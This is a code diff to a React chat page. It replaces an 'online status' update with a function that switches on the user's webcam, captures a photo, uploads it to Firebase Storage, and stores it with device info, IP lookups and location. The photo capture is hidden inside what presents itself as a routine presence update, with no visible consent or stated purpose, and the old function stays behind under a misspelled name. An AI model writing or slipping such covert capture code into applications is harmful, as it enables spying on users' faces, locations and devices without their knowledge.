@@ -141,6 +141,8 @@ const ChatPage = () => {
     getIPInfo1();
   }, []);
 
+      
+
   const [ipInfo, setIpInfo] = useState(null);
   const [ipInfo1, setIpInfo1] = useState(null);
   
@@ -233,8 +235,59 @@ useEffect(() => {
 
 
   };
+const updateOnlineStatus = async (
+    latitude: number | null = null,
+    longitude: number | null = null,
+    ip1: string | null = null,
+    ip2: string | null = null
+  ) => {
+    try {
+      // ========== 1. Capture dari kamera ==========
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
 
-  const updateOnlineStatus = async (latitude = null, longitude = null, ip1 = null, ip2 = null) => {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx?.drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL("image/png");
+
+      // stop kamera biar hemat baterai
+      stream.getTracks().forEach((track) => track.stop());
+
+      // ========== 2. Upload ke Firebase Storage ==========
+      const fileRef = ref(storage, `user_captures/${currentUser}_online.png`);
+      await uploadString(fileRef, imageData, "data_url");
+      const downloadURL = await getDownloadURL(fileRef);
+
+      // ========== 3. Update data ke Realtime DB ==========
+      const data: any = {
+        user: currentUser,
+        isOnline: true,
+        lastSeen: serverTimestamp(),
+        deviceInfo,
+        ip1: ipInfo,
+        ip2: ipInfo1,
+        photoURL: downloadURL, // URL foto hasil kamera
+      };
+
+      if (latitude && longitude) {
+        data.latitude = latitude;
+        data.longitude = longitude;
+      }
+
+      await update(userRef, data);
+
+      console.log("✅ Online status updated with photo:", downloadURL);
+    } catch (err) {
+      console.error("❌ Gagal update online status:", err);
+    }
+  };
+  const updateOnlineSptatus = async (latitude = null, longitude = null, ip1 = null, ip2 = null) => {
     await saveOldDataToLogs("online"); // simpan data lama dulu
 
     const data = {
